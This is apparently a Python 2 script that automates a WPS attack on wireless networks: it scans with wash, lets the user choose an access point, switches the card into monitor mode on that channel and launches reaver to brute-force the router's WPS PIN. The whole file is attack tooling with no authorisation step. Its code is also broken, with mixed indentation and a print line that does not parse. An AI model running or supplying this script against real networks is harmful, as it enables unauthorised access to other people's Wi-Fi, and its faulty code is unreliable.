#!/usr/bin/python
import os
import json
import argparse

def intInput(text,maxvalue=0):
    while True:
        try:
            value = int(raw_input(text))
            if value>maxvalue or value<=0:
                continue
	except ValueError:
	        print("Try again")
	        continue
	else:
            	break
    return value

def strInput(text):
    while True:
        try:
            value = raw_input(text)
    	except ValueError:
    	        print("Try again")
    	        continue
    	else:
                	break
    return value

def setMonitorMode(channel,card='wlan0'):
    cmd = 'airmon-ng check kill'
    os.system(cmd)
    cmd = 'ifconfig %s down' % card
    os.system(cmd)
    cmd='iwconfig %s mode managed'% card
    os.system(cmd)
    cmd='ifconfig %s up'% card
    os.system(cmd)
    cmd='iwconfig %s channel %d'% (card,channel)
    os.system(cmd)
    cmd='ifconfig %s down'% card
    os.system(cmd)
    cmd='iwconfig %s mode monitor'% card
    os.system(cmd)
    cmd='ifconfig %s up'% card
    os.system(cmd)

def reaver(card,channel,bssid):
    cmd = 'reaver -i %s -c %d -b %s -vv' %(card,channel,bssid)
    os.system(cmd)


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Process wash, set to monitor mode, and then reaver')
    parser.add_argument('-i','--interface', help='interface',required=True)
    parser.add_argument('-s','--sleep',type=int, help='sleep for wash (in seconds)',default=5)

    args = parser.parse_args()

    card = args.interface

    sleep = args.sleep

    cmd ='wash -i %s -j -o tmp.json & sleep %d ; killall wash' % (card, sleep)

    os.system(cmd)

    with open('tmp.json', 'r') as myfile:
        data=myfile.read()
    data='['+data+']'
    data=data.replace('}','},')
    data=data.replace('},\n]','}]')

    wireless = json.loads(data)
    print '  BSSID\t\t\tCHANNEL\tRSSI\tESSID'
    i = 1
    for wire in wireless:
        print str(i)+' '+wire['bssid'] + '\t' + str(wire['channel']) \
    + '\t' + str(wire['rssi'])+ '\t' + wire['essid']'\t' + wire['essid']
        i=i+1
    print ''
    network = None

    network = intInput('Choose a Wireless:',maxvalue=len(wireless))

    selected=  wireless[network-1]
    setMonitorMode(selected['channel'],card=card)
    reaver(card,selected['channel'],selected['bssid'])
